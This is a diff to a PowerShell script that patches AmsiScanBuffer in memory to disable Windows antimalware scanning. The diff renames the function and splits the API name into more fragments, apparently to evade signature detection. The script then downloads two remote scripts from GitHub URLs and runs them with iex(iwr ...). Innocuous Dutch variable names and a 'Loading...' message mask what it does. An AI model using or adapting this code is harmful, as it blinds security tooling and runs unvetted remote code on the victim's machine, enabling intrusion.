@@ -1,17 +1,17 @@
 write-host "Loading..."
 
-Function Onderhound {
+Function PoetsensMetJeSmoel {
     $VersVet = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABmAG8AbwAgAHsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATABvAGEAZABMAGkAYgByAGEAcgB5ACgAcwB0AHIAaQBuAGcAIABuAGEAbQBlACkAOwANAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AA0ACgB9AA=="))
     Add-Type -TypeDefinition $VersVet
     $Dreft = [foo]::LoadLibrary("am" + "si.dll")
-    $Borstel = [foo]::GetProcAddress($Dreft, "Amsi" + "Scan" + "Buffer")
+    $Borstel = [foo]::GetProcAddress($Dreft, "A" + "ms" + "i" + "Scan" + "Buf" + "fer")
     $WarmWater = 0
     $null = [foo]::VirtualProtect($Borstel, [uint32]5, 0x40, [ref]$WarmWater)
     $SopSopSop = [Byte[]] (184, 87, 0, 7, 128, 195)
     [System.Runtime.InteropServices.Marshal]::Copy($SopSopSop, 0, $Borstel, 6)
 }
 
-Onderhound
+PoetsensMetJeSmoel
 
 iex((iwr -UseBasicParsing https://raw.githubusercontent.com/justin-p/chef-vet/main/partysnacks.ps1).content)
 iex((iwr -UseBasicParsing https://raw.githubusercontent.com/justin-p/chef-vet/main/frituurpan.ps1).content)
